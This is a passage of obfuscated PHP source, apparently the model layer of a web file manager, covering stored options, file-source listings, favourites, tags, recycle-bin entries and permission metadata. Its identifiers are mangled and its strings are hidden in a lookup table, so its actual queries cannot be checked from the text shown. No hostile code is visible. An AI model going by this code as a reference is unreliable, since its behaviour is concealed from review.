Model($this->modelType)->set($åØ‚¶É›, !1, $this->optionType); } private function getAutoName($¬×¾û¬È) { $ìá±¹™µ = array_to_keyvalue($this->listData(), $_SERVER[ Ö‘ñÄ”][32]); if (!$ìá±¹™µ || !isset($ìá±¹™µ[$¬×¾û¬È])) { return $¬×¾û¬È; } for ($…‚ÙÉÑõ = 1; $…‚ÙÉÑõ < count($ìá±¹™µ); $…‚ÙÉÑõ++) { $•ÏŞƒ˜Ÿ = $¬×¾û¬È . "\x28{$…‚ÙÉÑõ}\x29"; if (!isset($ìá±¹™µ[$•ÏŞƒ˜Ÿ])) { return $•ÏŞƒ˜Ÿ; } } return $•ÏŞƒ˜Ÿ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($±Ò°ŠÉå = false, $”ûÍ„½¢ = '', $‰ÛÅËÏÜ = false) { $şŒ‰ãÖõ =& $_SERVER[ Ö‘ñÄ”]; $äÊÆ§àó = $this->cacheGet($”ûÍ„½¢); $“úÉ½úÙ = $this->optionDefault($”ûÍ„½¢); $“úÉ½úÙ = is_array($“úÉ½úÙ) ? $“úÉ½úÙ : array(); if (is_array($äÊÆ§àó)) { $äÊÆ§àó = array_merge($“úÉ½úÙ, $äÊÆ§àó); return $±Ò°ŠÉå ? isset($äÊÆ§àó[$±Ò°ŠÉå]) ? $äÊÆ§àó[$±Ò°ŠÉå] : null : $äÊÆ§àó; } $ê™şÁ…‰ = $this->filterWhere(array($şŒ‰ãÖõ[33] => $”ûÍ„½¢)); $äÊÆ§àó = $this->where($ê™şÁ…‰)->select(); $äÊÆ§àó = array_to_keyvalue($äÊÆ§àó, $şŒ‰ãÖõ[94], $şŒ‰ãÖõ[383]); foreach ($äÊÆ§àó as $ªÂ‘ş¦ı => $×ìóâ¦) { if ($‰ÛÅËÏÜ || in_array($ªÂ‘ş¦ı, $this->jsonField)) { $äÊÆ§àó[$ªÂ‘ş¦ı] = json_decode($×ìóâ¦, !0); } } $this->cacheSet($”ûÍ„½¢, $äÊÆ§àó); $äÊÆ§àó = array_merge($“úÉ½úÙ, $äÊÆ§àó); return $±Ò°ŠÉå ? $äÊÆ§àó[$±Ò°ŠÉå] : $äÊÆ§àó; } public function set($ÏåõŒÓ”, $÷Àİ­û = false, $Ø·»Šä£ = '') { $İ´Ã¤ =& $_SERVER[ Ö‘ñÄ”]; $this->cacheRemove($Ø·»Šä£); $ùÜ¶Ã¢Ù = array(); $¢Íµé‡´ = is_array($ÏåõŒÓ”) ? $ÏåõŒÓ” : array($ÏåõŒÓ” => $÷Àİ­û); foreach ($¢Íµé‡´ as $áñ›ê => $®°²„ª) { if (is_array($®°²„ª)) { $®°²„ª = json_encode_force($®°²„ª); } $this->checkLength($®°²„ª, !1, $this->tableName . $İ´Ã¤[4] . $ÏåõŒÓ”); $®°²„ª = self::textEncode($®°²„ª); $¢Íµé‡´ = array($İ´Ã¤[33] => $Ø·»Šä£, $İ´Ã¤[94] => $áñ›ê, $İ´Ã¤[383] => $®°²„ª); $ùÜ¶Ã¢Ù[] = $this->filterWhere($¢Íµé‡´); } if (!$ùÜ¶Ã¢Ù) { return !0; } $öú“³Ø„ = $this->cacheKey($İ´Ã¤[408]); CacheLock::lock($öú“³Ø„); $™¦ôú ó = $this->addAll($ùÜ¶Ã¢Ù, array(), !0); CacheLock::unlock($öú“³Ø„); return $™¦ôú ó; } protected function optionDefault($±½µñ‘ = '') { return !1; } public function setDeep($¿êõûè, $£á€ÇïÁ = false, $–Ì¾²ü™ = '') { $ƒÍ²‚®À = explode($_SERVER[ Ö‘ñÄ”][10], $¿êõûè); $®µÉåäª = $this->get(); array_set_value($®µÉåäª, $¿êõûè, $£á€ÇïÁ); $this->set($ƒÍ²‚®À[0], $®µÉåäª[$ƒÍ²‚®À[0]], $–Ì¾²ü™); } public function remove($İô´ùÄÌ, $‰©ªó„ = '') { $ƒı¡¸Ğ¥ =& $_SERVER[ Ö‘ñÄ”]; $this->cacheRemove($‰©ªó„); $¢ãõßğü = $this->filterWhere(array($ƒı¡¸Ğ¥[94] => $İô´ùÄÌ, $ƒı¡¸Ğ¥[33] => $‰©ªó„)); if (is_null($İô´ùÄÌ)) { unset($¢ãõßğü[$ƒı¡¸Ğ¥[94]]); } return $this->where($¢ãõßğü)->delete(); } public function cacheSet($Òó˜ÕÃÃ, $øû©Ì­ù = false) { return Cache::set($this->cacheKey($Òó˜ÕÃÃ), $øû©Ì­ù); } public function cacheGet($ç¹’Èæ›) { return Cache::get($this->cacheKey($ç¹’Èæ›)); } public function cacheRemove($Ä¼Øº¼) { return Cache::remove($this->cacheKey($Ä¼Øº¼)); } protected function filterWhere($ğ¸Â×íà) { return $ğ¸Â×íà; } protected function cacheKey($Æ•¯©“) { return $Æ•¯©“; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\145"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\145" => "\151\x6f\137\x73\157\x75\162\x63\145\x5f\155\145\x74\x61", "\x6d\145\x74\x61\106\151\x65\x6c\144" => "\163\157\x75\x72\x63\145\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\x69\x6d\x65", "\164\151\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\x75\x6e\143\164\x69\157\x6e"), array("\x63\x72\x65\141\164\x65\x54\151\155\145", "\164\151\155\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\156\143\x74\x69\157\x6e"), array("\x76\151\x65\167\x54\151\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\x74", "\146\165\x6e\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ó¥ıÔı») { return $this->listSource(array($_SERVER[ Ö‘ñÄ”][409] => $Ó¥ıÔı»)); } public function typeName($óùïç…¤) { static $¦Ù×°ã = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $¦Ù×°ã[$óùïç…¤ . $_SERVER[ Ö‘ñÄ”][12]]; } public function sourceListInfo($’ç¿ºà, $‹•ô¢°ğ = false) { $üö¥¥ =& $_SERVER[ Ö‘ñÄ”]; $’ç¿ºà = $’ç¿ºà ? $’ç¿ºà : array(); $’ç¿ºà = array_filter(array_unique($’ç¿ºà)); if (!$’ç¿ºà) { return array(); } $”ÅÀÖöÎ = $this->where(array($üö¥¥[410] => array($üö¥¥[7], $’ç¿ºà)))->select(); $this->_listDataApply($”ÅÀÖöÎ, $‹•ô¢°ğ); return array_to_keyvalue($”ÅÀÖöÎ, $üö¥¥[410]); } public function pathInfoFilter(&$Ã×æØ‹) { $ß°Ó¼œ© =& $_SERVER[ Ö‘ñÄ”]; static $“Óı”½Û = false; static $ÎúĞ¢ó— = false; static $ÚÒ¼˜Íí = false; if (!$“Óı”½Û) { $˜ŸØË˜÷ = $ß°Ó¼œ©[411]; $˜ŸØË˜÷ .= $ß°Ó¼œ©[412]; $˜ŸØË˜÷ .= $ß°Ó¼œ©[413]; $Ü–Ş“Û™ = $ß°Ó¼œ©[414]; $åñóèÃŒ = explode($ß°Ó¼œ©[50], $Ü–Ş“Û™); $“Óı”½Û = explode($ß°Ó¼œ©[50], $˜ŸØË˜÷); $ÎúĞ¢ó— = array(); foreach ($“Óı”½Û as $ÍÄéââŠ) { if (in_array($ÍÄéââŠ, $åñóèÃŒ)) { continue; } $ÎúĞ¢ó—[] = $ÍÄéââŠ; } $ÚÒ¼˜Íí = explode($ß°Ó¼œ©[50], $ß°Ó¼œ©[415]); } foreach ($ÚÒ¼˜Íí as $¤Çé©‡œ) { if (isset($Ã×æØ‹[$¤Çé©‡œ])) { $Ã×æØ‹[$¤Çé©‡œ] = intval($Ã×æØ‹[$¤Çé©‡œ]); } } $Ã×æØ‹[$ß°Ó¼œ©[84]] = $ß°Ó¼œ©[416] . $Ã×æØ‹[$ß°Ó¼œ©[410]] . $ß°Ó¼œ©[417]; $Ã×æØ‹[$ß°Ó¼œ©[33]] = $Ã×æØ‹[$ß°Ó¼œ©[418]] == 1 ? $ß°Ó¼œ©[75] : $ß°Ó¼œ©[199]; $Ã×æØ‹[$ß°Ó¼œ©[419]] = $this->typeName($Ã×æØ‹[$ß°Ó¼œ©[419]]); if ($Ã×æØ‹[$ß°Ó¼œ©[418]] != 1) { $Ã×æØ‹[$ß°Ó¼œ©[174]] = $Ã×æØ‹[$ß°Ó¼œ©[420]]; unset($Ã×æØ‹[$ß°Ó¼œ©[420]]); } $Â•ØÜ“‘ = $“Óı”½Û; if (isset($Ã×æØ‹[$ß°Ó¼œ©[421]]) && $Ã×æØ‹[$ß°Ó¼œ©[421]][$ß°Ó¼œ©[422]] == -1) { $Â•ØÜ“‘ = $ÎúĞ¢ó—; } $Ã×æØ‹ = array_field_key($Ã×æØ‹, $Â•ØÜ“‘); return $Ã×æØ‹; } public function listUserFav() { $†òÓ¯’ =& $_SERVER[ Ö‘ñÄ”]; $Äö„¤ô‚ = Model($†òÓ¯’[423])->listData(); $‹ú‹äê“ = array_filter_by_field($Äö„¤ô‚, $†òÓ¯’[33], $†òÓ¯’[424]); $‹ú‹äê“ = array_to_keyvalue($‹ú‹äê“, $†òÓ¯’[12], $†òÓ¯’[84]); if ($‹ú‹äê“) { $œ€ñĞÔ = $this->listSource(array($†òÓ¯’[425] => array($†òÓ¯’[426], $‹ú‹äê“))); } $œ€ñĞÔ = array_to_keyvalue($œ€ñĞÔ[$†òÓ¯’[378]], $†òÓ¯’[410]); foreach ($Äö„¤ô‚ as &$Ü–™½‚Ã) { $Ü–™½‚Ã = array($†òÓ¯’[427] => $Ü–™½‚Ã[$†òÓ¯’[407]], $†òÓ¯’[428] => $Ü–™½‚Ã[$†òÓ¯’[32]], $†òÓ¯’[429] => $Ü–™½‚Ã[$†òÓ¯’[84]], $†òÓ¯’[430] => $Ü–™½‚Ã[$†òÓ¯’[33]], $†òÓ¯’[431] => $Ü–™½‚Ã[$†òÓ¯’[200]], $†òÓ¯’[432] => $Ü–™½‚Ã[$†òÓ¯’[85]]); if ($Ü–™½‚Ã[$†òÓ¯’[33]] == $†òÓ¯’[424] && $œ€ñĞÔ[$Ü–™½‚Ã[$†òÓ¯’[84]]]) { $Ü–™½‚Ã[$†òÓ¯’[86]] = $œ€ñĞÔ[$Ü–™½‚Ã[$†òÓ¯’[84]]]; } } unset($Ü–™½‚Ã); return $Äö„¤ô‚; } public function listUserTag($‚§ËŞ«ğ) { $Ôê ‘ìá =& $_SERVER[ Ö‘ñÄ”]; if ($‚§ËŞ«ğ && !is_array($‚§ËŞ«ğ)) { $‚§ËŞ«ğ = array($‚§ËŞ«ğ); } $±èÁ¡Ä„ = Model($Ôê ‘ìá[433])->listData(); $ÕÍÔë¤ = array(); $éÍåƒ í = array(); foreach ($±èÁ¡Ä„ as $áŸªè¼š) { $¨›¬¸™ß = $áŸªè¼š[$Ôê ‘ìá[84]]; if (!$¨›¬¸™ß) { continue; } if (!isset($éÍåƒ í[$¨›¬¸™ß])) { $éÍåƒ í[$¨›¬¸™ß] = array(); } $éÍåƒ í[$¨›¬¸™ß][] = $áŸªè¼š[$Ôê ‘ìá[434]]; $ÕÍÔë¤[$áŸªè¼š[$Ôê ‘ìá[84]]] = $áŸªè¼š; } $œ°ƒíâì = array(); $À¥ÅÒ– = array(); $“Ò¢ï×ô = array(); foreach ($éÍåƒ í as $ığ†é´î => $Üˆœ•¤ó) { $™•ÖÎ­µ = !0; if (!$‚§ËŞ«ğ) { $œ°ƒíâì[] = $ığ†é´î; continue; } foreach ($‚§ËŞ«ğ as $ÁÆ§·Š) { if (!in_array($ÁÆ§·Š, $Üˆœ•¤ó)) { $™•ÖÎ­µ = !1; break; } } if (!$™•ÖÎ­µ) { continue; } if (!is_numeric($ığ†é´î)) { $ª¹¾¥½´ = $ÕÍÔë¤[$ığ†é´î]; $µç€öè = array($Ôê ‘ìá[32] => $ª¹¾¥½´[$Ôê ‘ìá[32]], $Ôê ‘ìá[84] => $ª¹¾¥½´[$Ôê ‘ìá[84]], $Ôê ‘ìá[33] => $ª¹¾¥½´[$Ôê ‘ìá[33]], $Ôê ‘ìá[86] => array($Ôê ‘ìá[435] => 1), $Ôê ‘ìá[201] => !0); if ($ª¹¾¥½´[$Ôê ‘ìá[33]] == $Ôê ‘ìá[199]) { $“Ò¢ï×ô[] = $µç€öè; } if ($ª¹¾¥½´[$Ôê ‘ìá[33]] == $Ôê ‘ìá[75]) { $À¥ÅÒ–[] = $µç€öè; } continue; } $œ°ƒíâì[] = $ığ†é´î; } if ($œ°ƒíâì) { $ÃèÀÇÔ… = $this->listSource(array($Ôê ‘ìá[425] => array($Ôê ‘ìá[426], $œ°ƒíâì))); } $ÃèÀÇÔ… = $ÃèÀÇÔ… ? $ÃèÀÇÔ… : array($Ôê ‘ìá[82] => array(), $Ôê ‘ìá[83] => array()); $ÃèÀÇÔ…[$Ôê ‘ìá[82]] = array_merge($ÃèÀÇÔ…[$Ôê ‘ìá[82]], $À¥ÅÒ–); $ÃèÀÇÔ…[$Ôê ‘ìá[83]] = array_merge($ÃèÀÇÔ…[$Ôê ‘ìá[83]], $“Ò¢ï×ô); if (isset($ÃèÀÇÔ…[$Ôê ‘ìá[375]]) && count($œ°ƒíâì) == $ÃèÀÇÔ…[$Ôê ‘ìá[375]][$Ôê ‘ìá[376]]) { return $ÃèÀÇÔ…; } $€ÙåÚı = array(); $§÷ãÌÀ = array_to_keyvalue($ÃèÀÇÔ…[$Ôê ‘ìá[82]], $Ôê ‘ìá[12], $Ôê ‘ìá[410]); $£‡¼Ü•Æ = array_to_keyvalue($ÃèÀÇÔ…[$Ôê ‘ìá[83]], $Ôê ‘ìá[12], $Ôê ‘ìá[410]); $ãÁ±åÚ‡ = array_merge($£‡¼Ü•Æ, $§÷ãÌÀ); foreach ($œ°ƒíâì as $¨›¬¸™ß) { if (!in_array($¨›¬¸™ß, $ãÁ±åÚ‡)) { $€ÙåÚı[] = $¨›¬¸™ß; } } if ($€ÙåÚı) { Model($Ôê ‘ìá[436])->removeBySource($€ÙåÚı); } return $ÃèÀÇÔ…; } public function listUserRecycle() { $İ–»‡„ =& $_SERVER[ Ö‘ñÄ”]; $ÓâôôÂÃ = Model($İ–»‡„[437])->listData(); if (!$ÓâôôÂÃ) { return array(); } $İèíÂ·˜ = array($İ–»‡„[425] => array($İ–»‡„[426], $ÓâôôÂÃ), $İ–»‡„[438] => 1); return $this->listSource($İèíÂ·˜); } public function listSource($ı¶Ü•¹á, $›î¨‡¼¯ = 3000, $°’äÇ‘‡ = false) { $ÁÀÚÚö¨ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($ı¶Ü•¹á[$ÁÀÚÚö¨[439]])) { $ı¶Ü•¹á[$ÁÀÚÚö¨[439]] = 0; } if (isset($ı¶Ü•¹á[$ÁÀÚÚö¨[440]]) && $ı¶Ü•¹á[$ÁÀÚÚö¨[440]] == $ÁÀÚÚö¨[197]) { $ı¶Ü•¹á[$ÁÀÚÚö¨[420]] = array($ÁÀÚÚö¨[340], $ÁÀÚÚö¨[441]); } $ï¬ğ²Ö¢ = $ÁÀÚÚö¨[442]; $Éíœ¾‚ = $this->field($ï¬ğ²Ö¢)->_makeOrder()->where($ı¶Ü•¹á)->selectPage($›î¨‡¼¯); $this->_listPageCheck($Éíœ¾‚, $ï¬ğ²Ö¢, $ı¶Ü•¹á); $this->_listDataApply($Éíœ¾‚[$ÁÀÚÚö¨[378]], $°’äÇ‘‡); $this->_listMake($Éíœ¾‚); return $Éíœ¾‚; } private function _listPageCheck(&$ˆ€Àá°Ò, $ÍÏõ‚À÷, $Á©Ë°Î¡) { $Ù„¡ÛÇÚ =& $_SERVER[ Ö‘ñÄ”]; if (!is_array($ˆ€Àá°Ò[$Ù„¡ÛÇÚ[375]])) { return; } $§ñ³‘÷ = $ˆ€Àá°Ò[$Ù„¡ÛÇÚ[375]]; if ($§ñ³‘÷[$Ù„¡ÛÇÚ[377]] <= 1) { return; } if ($§ñ³‘÷[$Ù„¡ÛÇÚ[376]] >= 100000) { return; } if (Model($Ù„¡ÛÇÚ[443])->get($Ù„¡ÛÇÚ[444]) != $Ù„¡ÛÇÚ[445]) { return; } $ÍÏõ‚À÷ = str_replace(array($Ù„¡ÛÇÚ[53], $Ù„¡ÛÇÚ[351], $Ù„¡ÛÇÚ[231]), $Ù„¡ÛÇÚ[12], $ÍÏõ‚À÷); $ÍÏõ‚À÷ = $Ù„¡ÛÇÚ[446] . str_replace($Ù„¡ÛÇÚ[50], $Ù„¡ÛÇÚ[447], $ÍÏõ‚À÷) . $Ù„¡ÛÇÚ[448]; $ªÍªŒ’… = $Ù„¡ÛÇÚ[449]; $ªÍªŒ’… = $ªÍªŒ’… . $Ù„¡ÛÇÚ[450]; $ùĞ—¢¹À = $§ñ³‘÷[$Ù„¡ÛÇÚ[372]] * ($§ñ³‘÷[$Ù„¡ÛÇÚ[362]] - 1) . $Ù„¡ÛÇÚ[50] . $§ñ³‘÷[$Ù„¡ÛÇÚ[372]]; $Ç´Ú¯àª = $this->_makeOrder(!0); $ìßÁİæ = $Ù„¡ÛÇÚ[446] . str_replace($Ù„¡ÛÇÚ[50], $Ù„¡ÛÇÚ[447], $Ç´Ú¯àª[0]); if (strpos($ìßÁİæ, $Ù„¡ÛÇÚ[451])) { $ìßÁİæ = str_replace($Ù„¡ÛÇÚ[451], $Ù„¡ÛÇÚ[452], $ìßÁİæ); } else { $ìßÁİæ .= $Ù„¡ÛÇÚ[453] . $Ç´Ú¯àª[1]; } $‡öğ·³¥ = array(); foreach ($Á©Ë°Î¡ as $ÀŞ“ÏË => $–Ö†®å) { $‡öğ·³¥[$Ù„¡ÛÇÚ[446] . $ÀŞ“ÏË] = $–Ö†®å; } $this->alias($Ù„¡ÛÇÚ[454])->field($ÍÏõ‚À÷)->limit($ùĞ—¢¹À)->order($ìßÁİæ); $‘¥™»™å = $this->join($ªÍªŒ’…)->where($‡öğ·³¥)->select(); if ($‘¥™»™å) { $ˆ€Àá°Ò[$Ù„¡ÛÇÚ[378]] = $‘¥™»™å; } } protected function _makeOrder($¨“µ = false) { $£á©¬ãß =& $_SERVER[ Ö‘ñÄ”]; $Èø™ëâÉ = Model($£á©¬ãß[455])->get($£á©¬ãß[456]); $”½ş·÷á = Model($£á©¬ãß[455])->get($£á©¬ãß[457]); $Û³Ó„šª = array($£á©¬ãß[458] => $£á©¬ãß[459], $£á©¬ãß[460] => $£á©¬ãß[461]); $—ÒÏùâÓ = array($£á©¬ãß[32] => $£á©¬ãß[32], $£á©¬ãß[76] => $£á©¬ãß[76], $£á©¬ãß[174] => $£á©¬ãß[420], $£á©¬ãß[462] => $£á©¬ãß[462], $£á©¬ãß[463] => $£á©¬ãß[464], $£á©¬ãß[200] => $£á©¬ãß[200], $£á©¬ãß[85] => $£á©¬ãß[85]); $ä×Ó¤—  = Input::get($£á©¬ãß[465], $£á©¬ãß[7], $Èø™ëâÉ, array_keys($—ÒÏùâÓ)); $Ì»¢ãšİ = Input::get($£á©¬ãß[466], $£á©¬ãß[7], $”½ş·÷á, array_keys($Û³Ó„šª)); if (!in_array($ä×Ó¤— , array_keys($—ÒÏùâÓ))) { $ä×Ó¤—  = $£á©¬ãß[32]; } if (!in_array($Ì»¢ãšİ, array_keys($Û³Ó„šª))) { $ä×Ó¤—  = $£á©¬ãß[458]; } if ($ä×Ó¤—  == $£á©¬ãß[32]) { } $ÂÑá…µ = $£á©¬ãß[467] . $—ÒÏùâÓ[$ä×Ó¤— ] . $£á©¬ãß[53] . $Û³Ó„šª[$Ì»¢ãšİ]; $ÂÑá…µ = rtrim(trim($ÂÑá…µ), $£á©¬ãß[50]); if ($¨“µ) { return array($ÂÑá…µ, $Û³Ó„šª[$Ì»¢ãšİ]); } return $this->order($ÂÑá…µ); } protected function _listDataApplyItem($§İÑŞÇœ, $¨Õ¯±‡’ = false) { $œÉà±öë = array($§İÑŞÇœ); $this->_listDataApply($œÉà±öë, $¨Õ¯±‡’); return $œÉà±öë[0]; } protected function _listDataApply(&$ÛòÍùÓ, $¾åä—é† = false) { $òÆ›Æá =& $_SERVER[ Ö‘ñÄ”]; if (!$ÛòÍùÓ) { $ÛòÍùÓ = array(); return; } $ì‰¹³Ê = array_to_keyvalue($ÛòÍùÓ, $òÆ›Æá[12], $òÆ›Æá[410]); $ì‰¹³Ê = array_unique($ì‰¹³Ê); $this->_listSourceCache($ÛòÍùÓ); if (!$¾åä—é†) { $this->_listAppendMeta($ÛòÍùÓ, $ì‰¹³Ê); $this->_listAppendFileMeta($ÛòÍùÓ, $ì‰¹³Ê); $this->_listAppendChildren($ÛòÍùÓ, $ì‰¹³Ê); } $this->_listAppendPath($ÛòÍùÓ); $this->_listAppendAuth($ÛòÍùÓ); $this->_listAppendSourceInfo($ÛòÍùÓ, $ì‰¹³Ê); $this->_listAppendUser($ÛòÍùÓ); $this->_listFilterInfo($ÛòÍùÓ, $¾åä—é†); $this->_listAppendAuthSecret($ÛòÍùÓ); } protected function _listSourceCache($‹§†Ş£™) { $ñƒĞ±À€ =& $_SERVER[ Ö‘ñÄ”]; foreach ($‹§†Ş£™ as $İ«Ñ·•) { self::$cacheSourceInfo[$ñƒĞ±À€[468] . $İ«Ñ·•[$ñƒĞ±À€[410]]] = $İ«Ñ·•; } } protected function _listFilterInfo(&$‘ª‘•‘, $ãêŸç„¸ = false) { $àõÌêØ¼ =& $_SERVER[ Ö‘ñÄ”]; foreach ($‘ª‘•‘ as &$İš«¤Ğ”) { $İš«¤Ğ” = $this->pathInfoFilter($İš«¤Ğ”); self::$cachePathInfo[$àõÌêØ¼[469] . intval($ãêŸç„¸) . $àõÌêØ¼[394] . $İš«¤Ğ”[$àõÌêØ¼[410]]] = $İš«¤Ğ”; } unset($İš«¤Ğ”); } protected function _listMake(&$¸¶À„Õë) { $¢©ş©ì =& $_SERVER[ Ö‘ñÄ”]; $¸¶À„Õë[$¢©ş©ì[82]] = array(); $¸¶À„Õë[$¢©ş©ì[83]] = array(); foreach ($¸¶À„Õë[$¢©ş©ì[378]] as $÷á£ŒÈÛ) { $õÇ×ïéÕ = $÷á£ŒÈÛ[$¢©ş©ì[418]] == 1 ? $¢©ş©ì[82] : $¢©ş©ì[83]; $¸¶À„Õë[$õÇ×ïéÕ][] = $÷á£ŒÈÛ; } unset($¸¶À„Õë[$¢©ş©ì[378]]); } protected function _listAppendMeta(&$Ë«¹ÂúÎ, $Ñ”Óµ˜›) { $ñ¢Î÷ª =& $_SERVER[ Ö‘ñÄ”]; $À¬¤ÔÇ¾ = array($ñ¢Î÷ª[425] => array($ñ¢Î÷ª[426], $Ñ”Óµ˜›)); $Ñåïè´É = Model($ñ¢Î÷ª[470])->field($ñ¢Î÷ª[471])->where($À¬¤ÔÇ¾)->select(); if (!$Ñåïè´É) { return; } $›ŸšäŒÄ = array($ñ¢Î÷ª[472], $ñ¢Î÷ª[473], $ñ¢Î÷ª[452]); $ê«Ù ñÖ = array(); foreach ($Ñåïè´É as $ÈÊ®Õöğ) { if (!isset($ê«Ù ñÖ[$ÈÊ®Õöğ[$ñ¢Î÷ª[410]]])) { $ê«Ù ñÖ[$ÈÊ®Õöğ[$ñ¢Î÷ª[410]]] = array(); } if (in_array($ÈÊ®Õöğ[$ñ¢Î÷ª[94]], $›ŸšäŒÄ)) { continue; } $ê«Ù ñÖ[$ÈÊ®Õöğ[$ñ¢Î÷ª[410]]][$ÈÊ®Õöğ[$ñ¢Î÷ª[94]]] = $ÈÊ®Õöğ[$ñ¢Î÷ª[383]]; } foreach ($Ë«¹ÂúÎ as &$µâÌµãÏ) { $µâÌµãÏ[$ñ¢Î÷ª[474]] = !1; if (isset($ê«Ù ñÖ[$µâÌµãÏ[$ñ¢Î÷ª[410]]])) { $µâÌµãÏ[$ñ¢Î÷ª[474]] = $ê«Ù ñÖ[$µâÌµãÏ[$ñ¢Î÷ª[410]]]; } if ($this->fileIsLock($µâÌµãÏ) && $µâÌµãÏ[$ñ¢Î÷ª[421]]) { $£º×é÷ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $µâÌµãÏ[$ñ¢Î÷ª[421]][$ñ¢Î÷ª[422]] = AuthModel::authDisable($µâÌµãÏ[$ñ¢Î÷ª[421]][$ñ¢Î÷ª[422]], $£º×é÷); $µâÌµãÏ[$ñ¢Î÷ª[421]][$ñ¢Î÷ª[475]][$ñ¢Î÷ª[421]] = $µâÌµãÏ[$ñ¢Î÷ª[421]][$ñ¢Î÷ª[422]]; } } unset($µâÌµãÏ); } protected function _listAppendFileMeta(&$³û«¸±÷, $õ”ò®Ã) { $¡™…õÂÌ =& $_SERVER[ Ö‘ñÄ”]; $­ëş»Æ = array_to_keyvalue($³û«¸±÷, $¡™…õÂÌ[12], $¡™…õÂÌ[476]); $­ëş»Æ = array_filter(array_unique($­ëş»Æ)); if (!$­ëş»Æ) { return; } $¸ÎóÌ…Ñ = array($¡™…õÂÌ[477] => array($¡™…õÂÌ[426], $­ëş»Æ)); $¾ÅöŠ = $¡™…õÂÌ[478]; $ãâÄŸãÏ = Model($¡™…õÂÌ[479])->field($¾ÅöŠ)->where($¸ÎóÌ…Ñ)->select(); $ãâÄŸãÏ = array_to_keyvalue($ãâÄŸãÏ, $¡™…õÂÌ[476]); $Õı ğ‡á = Model($¡™…õÂÌ[480])->field($¡™…õÂÌ[481])->where($¸ÎóÌ…Ñ)->select(); $Õı ğ‡á = $Õı ğ‡á ? $Õı ğ‡á : array(); $§åŸî‹Ù = array(); foreach ($Õı ğ‡á as $Ğô¹äÌ€) { if (!isset($§åŸî‹Ù[$Ğô¹äÌ€[$¡™…õÂÌ[476]]])) { $§åŸî‹Ù[$Ğô¹äÌ€[$¡™…õÂÌ[476]]] = array(); } $§åŸî‹Ù[$Ğô¹äÌ€[$¡™…õÂÌ[476]]][$Ğô¹äÌ€[$¡™…õÂÌ[94]]] = $Ğô¹äÌ€[$¡™…õÂÌ[383]]; } foreach ($³û«¸±÷ as &$›‰†³×„) { $İáúäâä = $›‰†³×„[$¡™…õÂÌ[476]]; if (!$İáúäâä || !is_array($ãâÄŸãÏ[$İáúäâä])) { continue; } $¶¯Îêşó = $ãâÄŸãÏ[$İáúäâä]; $¶¯Îêşó[$¡™…õÂÌ[76]] = $›‰†³×„[$¡™…õÂÌ[76]]; $¶¯Îêşó[$¡™…õÂÌ[32]] = $›‰†³×„[$¡™…õÂÌ[32]]; if (!isset(self::$cacheFileInfo[$¡™…õÂÌ[482] . $İáúäâä])) { self::$cacheFileInfo[$¡™…õÂÌ[482] . $İáúäâä] = array_merge(array(), $¶¯Îêşó); } unset($ãâÄŸãÏ[$İáúäâä][$¡™…õÂÌ[84]]); $ã½ëû = is_array($§åŸî‹Ù[$İáúäâä]) ? $§åŸî‹Ù[$İáúäâä] : array(); $›‰†³×„[$¡™…õÂÌ[170]] = array_merge($ã½ëû, $ãâÄŸãÏ[$İáúäâä]); if (isset($›‰†³×„[$¡™…õÂÌ[170]][$¡™…õÂÌ[169]])) { $›‰†³×„[$¡™…õÂÌ[169]] = json_decode($›‰†³×„[$¡™…õÂÌ[170]][$¡™…õÂÌ[169]], !0); unset($›‰†³×„[$¡™…õÂÌ[170]][$¡™…õÂÌ[169]]); } } unset($›‰†³×„); } protected function _listAppendSourceInfo(&$¹Ú“¤©¨, $œÔÃÆá) { $‹‰ÚËê¥ =& $_SERVER[ Ö‘ñÄ”]; if (!defined($‹‰ÚËê¥[483])) { return; } $ğÄ¼â¢ä = Model($‹‰ÚËê¥[484])->listData(); $ùá¡ÁÖı = Model($‹‰ÚËê¥[433])->listData(); $é‚²Ôîù = Model($‹‰ÚËê¥[423])->listData(); $µÑíù½ = Model($‹‰ÚËê¥[485])->listSimple(); $›±¬³¬ = array_to_keyvalue($ğÄ¼â¢ä, $‹‰ÚËê¥[407]); $ÓÌ¬¶ß = array_to_keyvalue_group($ùá¡ÁÖı, $‹‰ÚËê¥[84], $‹‰ÚËê¥[434]); $†å¦Áäã = array_to_keyvalue($é‚²Ôîù, $‹‰ÚËê¥[84]); $é¡—İéá = array_to_keyvalue_group($µÑíù½, $‹‰ÚËê¥[410]); foreach ($¹Ú“¤©¨ as &$ˆ²Üû£Ç) { $ˆ²Üû£Ç[$‹‰ÚËê¥[86]] = array($‹‰ÚËê¥[486] => 0, $‹‰ÚËê¥[487] => 0, $‹‰ÚËê¥[488] => 0); if (isset($†å¦Áäã[$ˆ²Üû£Ç[$‹‰ÚËê¥[410]]])) { $ˆ²Üû£Ç[$‹‰ÚËê¥[86]][$‹‰ÚËê¥[489]] = 1; $ˆ²Üû£Ç[$‹‰ÚËê¥[86]][$‹‰ÚËê¥[490]] = $†å¦Áäã[$ˆ²Üû£Ç[$‹‰ÚËê¥[410]]][$‹‰ÚËê¥[32]]; } if ($ÓÌ¬¶ß && $›±¬³¬ && isset($ÓÌ¬¶ß[$ˆ²Üû£Ç[$‹‰ÚËê¥[410]]])) { $ˆ²Üû£Ç[$‹‰ÚËê¥[86]][$‹‰ÚËê¥[491]] = array(); foreach ($ÓÌ¬¶ß[$ˆ²Üû£Ç[$‹‰ÚËê¥[410]]] as $¥‘£ÂØ–) { $ÔÏê¬¾î = $›±¬³¬[$¥‘£ÂØ–]; $ˆ²Üû£Ç[$‹‰ÚËê¥[86]][$‹‰ÚËê¥[491]][] = array($‹‰ÚËê¥[492] => $ÔÏê¬¾î[$‹‰ÚËê¥[407]], $‹‰ÚËê¥[428] => 